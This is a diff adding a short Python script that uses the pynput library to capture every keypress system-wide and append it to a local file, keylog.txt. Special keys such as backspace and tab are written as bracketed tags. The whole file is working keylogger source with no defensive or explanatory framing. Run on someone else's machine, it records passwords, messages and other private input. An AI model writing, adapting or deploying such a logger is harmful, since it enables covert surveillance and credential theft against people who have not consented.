@@ -1,0 +1,29 @@
+from pynput import keyboard
+
+# File to save keystrokes
+log_file = "keylog.txt"
+
+# Function to write keystrokes to the file
+def write_to_file(key):
+    with open(log_file, "a") as f:
+        f.write(f"{key}\n")
+
+# Callback function to be called when a key is pressed
+def on_press(key):
+    try:
+        write_to_file(key.char)
+    except AttributeError:
+        if key == keyboard.Key.space:
+            write_to_file(" ")
+        elif key == keyboard.Key.enter:
+            write_to_file("\n")
+        elif key == keyboard.Key.backspace:
+            write_to_file(" [BACKSPACE] ")
+        elif key == keyboard.Key.tab:
+            write_to_file(" [TAB] ")
+        else:
+            write_to_file(f" [{key}] ")
+
+# Listener to monitor keypresses
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
